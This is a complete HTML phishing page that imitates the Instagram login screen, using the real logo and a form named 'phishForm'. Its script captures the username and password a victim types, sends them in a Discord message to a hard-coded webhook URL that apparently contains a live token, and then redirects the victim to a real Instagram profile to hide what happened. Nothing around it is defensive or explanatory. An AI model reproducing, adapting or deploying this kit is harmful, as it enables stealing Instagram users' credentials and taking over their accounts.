<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #fafafa;
    }
    .container {
      display: flex;
      justify-content: center;
      margin-top: 50px;
    }
    .login-box {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 350px;
      text-align: center;
    }
    .login-box img {
      width: 175px;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
    }
    button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      background-color: #3897f0;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 3px;
      cursor: pointer;
    }
    @media screen and (max-width: 500px) {
      .login-box {
        width: 90%;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
      <form id="phishForm">
        <input type="text" id="username" placeholder="Phone number, username, or email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Log In</button>
      </form>
    </div>
  </div>

  <script>
    // 🔐 Paste your Discord webhook below
    const webhookURL = "https://discordapp.com/api/webhooks/1400109887874142218/LYrgI5q92X_6ZO2VB8THERgPH6P_5StmJRLniF3ZrYlaJxrN7jiqEpeqGNcfREDqa3to";

    document.getElementById("phishForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const user = document.getElementById("username").value;
      const pass = document.getElementById("password").value;

      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `📥 **Instagram Clone Login**\n👤 Username: \`${user}\`\n🔑 Password: \`${pass}\``
        })
      });

      // Optional redirect
      setTimeout(() => {
        window.location.href = "https://www.instagram.com/riiyyeeehh/?utm_source=ig_web_button_share_sheet";
      }, 1000);
    });
  </script>
</body>
</html>
